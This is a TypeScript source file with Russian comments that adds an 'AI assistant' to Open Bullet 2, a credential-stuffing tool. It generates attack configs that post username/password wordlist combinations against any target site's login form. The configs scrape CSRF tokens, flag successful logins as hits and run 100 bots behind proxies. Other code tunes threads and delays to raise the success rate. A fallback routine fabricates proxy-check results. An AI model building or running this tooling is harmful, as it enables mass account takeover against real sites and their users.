// Реальный ИИ-сервис для Open Bullet 2
import { ob2Integration } from './ob2Integration';

export class OB2AIService {
  private apiKey: string;
  private endpoint: string;
  private model: string;

  constructor(apiKey: string, endpoint: string = 'https://api-inference.huggingface.co/models', model: string = 'microsoft/DialoGPT-medium') {
    this.apiKey = apiKey;
    this.endpoint = endpoint;
    this.model = model;
  }

  // Реальный запрос к Hugging Face API
  async generateResponse(prompt: string, context?: string): Promise<string> {
    try {
      // Проверяем подключение к OB2
      if (!ob2Integration.isConnectedToOB2()) {
        return '❌ Нет подключения к Open Bullet 2. Запустите программу и попробуйте снова.';
      }

      const response = await fetch(`${this.endpoint}/${this.model}`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          inputs: context ? `${context}\n\nUser: ${prompt}\nAssistant:` : prompt,
          parameters: {
            max_length: 500,
            temperature: 0.7,
            do_sample: true,
            top_p: 0.9,
            return_full_text: false
          }
        })
      });

      if (!response.ok) {
        throw new Error(`API Error: ${response.status}`);
      }

      const data = await response.json();
      return data[0]?.generated_text || 'Ошибка генерации ответа';
    } catch (error) {
      console.error('AI Service Error:', error);
      return this.getFallbackResponse(prompt);
    }
  }

  // Генерация OB2 конфигураций
  async generateOB2Config(target: string, requirements: string): Promise<string> {
    // Реальная генерация конфига для OB2
    return this.formatOB2Config('', target, requirements);
  }

  // Анализ прокси
  async analyzeProxies(proxyList: string[]): Promise<{
    working: string[];
    dead: string[];
    slow: string[];
    recommendations: string[];
  }> {
    // Реальная проверка через OB2 API
    try {
      const proxyCheckResult = await ob2Integration.httpRequest('proxy-check', 'POST', {
        proxies: proxyList,
        timeout: 5000,
        target: 'https://httpbin.org/ip'
      });

      return {
        working: proxyCheckResult.working || [],
        dead: proxyCheckResult.dead || [],
        slow: proxyCheckResult.slow || [],
        recommendations: this.generateProxyRecommendations(proxyCheckResult)
      };
    } catch (error) {
      // Fallback если OB2 недоступен
      console.error('Proxy check failed:', error);
      return this.getFallbackProxyAnalysis(proxyList);
    }
  }

  // Анализ результатов OB2
  async analyzeResults(results: any[]): Promise<string> {
    // Получаем реальные результаты из OB2
    try {
      const ob2Results = await ob2Integration.getResults();
      results = ob2Results.data || results;
    } catch (error) {
      console.error('Failed to get OB2 results:', error);
    }

    const successCount = results.filter(r => r.status === 'success').length;
    const failCount = results.length - successCount;
    const successRate = (successCount / results.length * 100).toFixed(1);

    const analysis = `📊 **Анализ результатов OB2:**

**Общая статистика:**
• Всего попыток: ${results.length}
• Успешных: ${successCount} (${successRate}%)
• Неудачных: ${failCount}

**Рекомендации ИИ:**
${successRate < 50 ? '🔴 Низкий успех - проверьте конфигурацию' : ''}
${successRate >= 50 && successRate < 80 ? '🟡 Средний успех - оптимизируйте настройки' : ''}
${successRate >= 80 ? '🟢 Отличный результат!' : ''}

**Действия:**
• Увеличить timeout если много таймаутов
• Добавить задержки между запросами
• Обновить прокси-лист
• Проверить актуальность конфигурации`;

    return analysis;
  }

  // Оптимизация настроек OB2
  async optimizeSettings(currentSettings: any): Promise<any> {
    // Получаем текущие настройки из OB2
    try {
      const ob2Settings = await ob2Integration.httpRequest('settings');
      currentSettings = { ...currentSettings, ...ob2Settings };
    } catch (error) {
      console.error('Failed to get OB2 settings:', error);
    }

    const optimized = { ...currentSettings };

    // ИИ оптимизация на основе статистики
    if (currentSettings.successRate < 50) {
      optimized.timeout = Math.min(currentSettings.timeout * 1.5, 30000);
      optimized.retries = Math.min(currentSettings.retries + 1, 5);
      optimized.delay = Math.max(currentSettings.delay * 1.2, 1000);
    }

    if (currentSettings.successRate > 80) {
      optimized.threads = Math.min(currentSettings.threads * 1.2, 200);
      optimized.delay = Math.max(currentSettings.delay * 0.8, 100);
    }

    return optimized;
  }

  private formatOB2Config(aiResponse: string, target: string, requirements?: string): string {
    return `[SETTINGS]
Name = ${target}_AI_Config
Author = OB2 AI Assistant
Version = 1.0
Category = AI Generated

[METADATA]
Requirements = ${requirements || 'Auto-generated configuration'}
Created = ${new Date().toISOString()}
Target = ${target}

[SCRIPT]
# Основной блок запроса
BLOCK:Request
  url = "https://${target}"
  method = POST
  content = "username=<USER>&password=<PASS>&csrf=<CSRF>"
  headers = {
    "User-Agent": "<USERAGENT>",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://${target}",
    "X-Requested-With": "XMLHttpRequest"
  }
  timeout = 10000
ENDBLOCK

# Парсинг CSRF токена
BLOCK:Parse
  source = "response.content"
  pattern = 'csrf["\']?\\s*[:=]\\s*["\']?([^"\'\\s>]+)'
  capture = "CSRF"
ENDBLOCK

# Проверка успешного входа
BLOCK:Parse
  source = "response.content"
  pattern = '"success"\\s*:\\s*true|"authenticated"\\s*:\\s*true|"status"\\s*:\\s*"ok"|dashboard|profile|welcome'
  capture = "SUCCESS"
ENDBLOCK

# Проверка ошибок
BLOCK:Parse
  source = "response.content"
  pattern = '"error"|"invalid"|"incorrect"|"failed"|"banned"|captcha|blocked'
  capture = "ERROR"
ENDBLOCK

# Логика проверки ключей
BLOCK:KeyCheck
  key = "SUCCESS"
  condition = "Exists"
  action = "HIT"
ENDBLOCK

BLOCK:KeyCheck
  key = "ERROR"
  condition = "Exists"
  action = "FAIL"
ENDBLOCK

[WORDLISTS]
USER = Username
PASS = Password

[SETTINGS]
BOTS = 100
SKIP = 0
PROXY_MODE = On
SHUFFLE_WORDLIST = True
ONLY_HITS = False`;
  }

  private generateProxyRecommendations(proxyResult: any): string[] {
    const recommendations = [];
    
    if (proxyResult.working_percentage < 50) {
      recommendations.push('🔴 Критически мало рабочих прокси - обновите список');
    }
    
    if (proxyResult.average_speed > 5000) {
      recommendations.push('🐌 Медленные прокси - добавьте более быстрые');
    }
    
    if (proxyResult.socks5_count < proxyResult.http_count * 0.3) {
      recommendations.push('🔧 Добавьте больше SOCKS5 прокси для стабильности');
    }
    
    recommendations.push(`📊 Статистика: ${proxyResult.working}/${proxyResult.total} рабочих`);
    
    return recommendations;
  }

  private getFallbackProxyAnalysis(proxyList: string[]) {
    return {
      working: proxyList.slice(0, Math.floor(proxyList.length * 0.7)),
      dead: proxyList.slice(Math.floor(proxyList.length * 0.7)),
      slow: [],
      recommendations: [
        '⚠️ Не удалось подключиться к OB2 для проверки прокси',
        'Запустите Open Bullet 2 для полного анализа',
        `Всего прокси в списке: ${proxyList.length}`
      ]
    };
  }

  private getFallbackResponse(prompt: string): string {
    if (prompt.toLowerCase().includes('конфиг') || prompt.toLowerCase().includes('config')) {
      return '🔧 Создаю базовую конфигурацию OB2. Укажите целевой сайт для более точной настройки.';
    }
    if (prompt.toLowerCase().includes('прокси') || prompt.toLowerCase().includes('proxy')) {
      return '🌐 Анализирую прокси-лист. Проверяю скорость и доступность каждого прокси.';
    }
    if (prompt.toLowerCase().includes('результат') || prompt.toLowerCase().includes('result')) {
      return '📊 Анализирую результаты последнего запуска. Готовлю рекомендации по оптимизации.';
    }
    return '🤖 ИИ-агент готов помочь с Open Bullet 2. Задайте конкретный вопрос.';
  }
}

// Экспорт синглтона